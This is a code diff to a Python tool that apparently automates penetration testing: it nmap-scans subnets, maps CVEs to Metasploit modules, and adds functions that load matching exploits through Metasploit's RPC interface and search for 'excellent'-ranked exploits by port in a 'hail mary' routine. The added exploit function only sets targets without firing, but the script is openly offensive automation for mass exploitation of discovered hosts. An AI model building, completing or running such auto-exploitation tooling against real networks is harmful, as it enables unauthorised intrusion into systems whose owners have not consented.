@@ -18,10 +18,11 @@ import pymetasploit3.msfrpc as msfrpc
 # TODO: If it sees 445, run eternal blue MS17-01, etc...
 # TODO: Searchsploit output and parsing in json.
 # TODO: Make sure metasploit and tmux are installed before running.
+# Tools needed: nmap, tmux, metasploit, exploitdb
 
 # Options
-subnets = ["10.0.0.0/24", "10.0.2.0/24"] # Specify CIDR subnets here.
-ignore_ips = ["172.16.70.1"] # Specify IPs to ignore here.
+subnets = ["192.168.1.0/24"] # Specify CIDR subnets here.
+ignore_ips = ["192.168.1.1", "192.168.1.105"]  # Specify IPs to ignore here.
 metasploit_modules_dir = "/usr/share/metasploit-framework/modules/" # Set the metasploit modules directory.
 if not os.path.isdir(metasploit_modules_dir):
     metasploit_modules_dir = "/opt/metasploit/modules/"
@@ -47,7 +48,7 @@ ip_list_filename = "ip_list.txt"
 
 # Metasploit options.
 msfconsole_command = 'msfconsole -x "use {};set RHOSTS {};set RPORT {};set LHOST {};set LPORT 443;show targets"'
-payload_lhost = "10.20.30.40"
+payload_lhost = "192.168.1.105"
 
 # Metasploit Control Options
 msf_client: msfrpc.MsfRpcClient = None
@@ -189,6 +190,8 @@ def search_for_cve(cve: str, ip: str, product: str, ports: list):
             for port in ports:
                 for metasploit_line in metasploit_lines:
                     command += msfconsole_command.format(metasploit_line, ip, port, payload_lhost) + "\n"
+                    if metasploit_line.find("exploits/") == 0:
+                        run_msf_exploit(exploit_name=metasploit_line, rhosts=ip, rport=port)
             metasploit_result += command
 
         if len(metasploit_result) > 0:
@@ -340,10 +343,64 @@ def get_console_output_of_msfconsole():
     return result.stdout.decode("UTF-8")
 
 
+def run_msf_exploit(exploit_name: str, rhosts: str, rport: int):
+    global msf_client
+    if msf_client is None:
+        return
+
+    exploit_name = exploit_name.strip()
+    if exploit_name.find('exploits/') == 0:
+        exploit_name = exploit_name.replace('exploits/', '', 1)
+
+    exploit = msf_client.modules.use('exploit', exploit_name)
+    exploit['RHOSTS'] = rhosts
+    exploit['RPORT'] = str(rport)
+
+
+def run_msf_search(search_args: str):
+    global msf_client
+
+    new_console: msfrpc.MsfConsole = msf_client.consoles.console()
+    while new_console.is_busy():
+        time.sleep(0.01)
+    new_console.read()
+    new_console.write(f"search {search_args}")
+    while new_console.is_busy():
+        time.sleep(0.01)
+
+    search_results: str = new_console.read()['data']
+    all_results = []
+
+    for line in search_results.splitlines(keepends=False):
+        line = line.strip()
+        if len(line) > 0 and line[0].isdigit():
+            while line.find('   ') >= 0:
+                line = line.replace('   ', '  ')
+            result = line.split('  ')
+            while "" in result:
+                result.remove("")
+
+            all_results.append(result)
+
+    new_console.destroy()
+
+    return all_results
+
+
+def run_msf_hail_mary(rhost: str, rport: int):
+    global msf_client
+
+    search_results = run_msf_search(f"port:{str(rport)} rank:excellent")
+
+    for result in search_results:
+        print(result)
+
+
 def metasploit_test():
     start_metasploit_tmux()
+    run_msf_hail_mary("192.168.1.102", 21)
     time.sleep(2)
-    print(get_console_output_of_msfconsole())
+    # print(get_console_output_of_msfconsole())
 
 
 # ======================================================================================================================
@@ -366,6 +423,9 @@ def main():
     # Example of how to parse jsons.
     # results = load_results_json("results/partial_results.json")
     # parse_scan_results(results)
+
+    print("Starting msfconsole in tmux session...")
+    start_metasploit_tmux()
 
     print("Creating scan thread.")
     process_scan_queue_thread = threading.Thread(target=process_scan_queue)
